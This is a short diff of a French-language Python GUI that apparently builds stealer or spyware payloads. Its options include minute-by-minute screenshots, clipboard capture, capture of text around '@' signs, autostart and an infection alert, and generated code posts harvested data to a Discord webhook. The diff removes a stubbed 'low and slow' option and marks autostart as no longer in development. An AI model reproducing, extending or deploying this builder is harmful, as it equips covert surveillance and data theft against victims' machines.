@@ -225,7 +225,6 @@ def pyw():
             "clipboard": clipboard_var.get(),
             "autostart": autostart_var.get(),
             "capture_before_after_at": capture_var.get(),
-            "low_and_slow": low_slow_var.get(),
             "alert_on_infection": alert_var.get()
         }
     }
@@ -351,13 +350,6 @@ def pyw():
                 '    )\n'
                 '    requests.post(discord_webhook, json={"content": name})\n\n'
             )
-
-
-        # Autres options (fonction vide)
-        for opt in ["autostart", "low_and_slow"]:
-            if config["options"][opt]:
-                f.write(f"def {opt}_option_func():\n")
-                f.write(f"    print('Option {opt} activée')\n\n")
 
         # Lancement des threads
         f.write("if __name__ == '__main__':\n")
@@ -528,12 +520,10 @@ screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran chaque minute", 
 screenshot_option.pack(pady=5)
 clipboard_option = ctk.CTkCheckBox(app, text="Capture du presse-papier", variable=clipboard_var)
 clipboard_option.pack(pady=5)
-autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique (En développement)", variable=autostart_var)
+autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique", variable=autostart_var)
 autostart_option.pack(pady=5)
 capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et après", variable=capture_var)
 capture_before_after_at_option.pack(pady=5)
-low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow (En développement)", variable=low_slow_var)
-low_and_slow_option.pack(pady=5)
 alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", variable=alert_var)
 alert_on_infection_option.pack(pady=5)
 switch = ctk.CTkSwitch(app, textvariable=jsp, command=text)
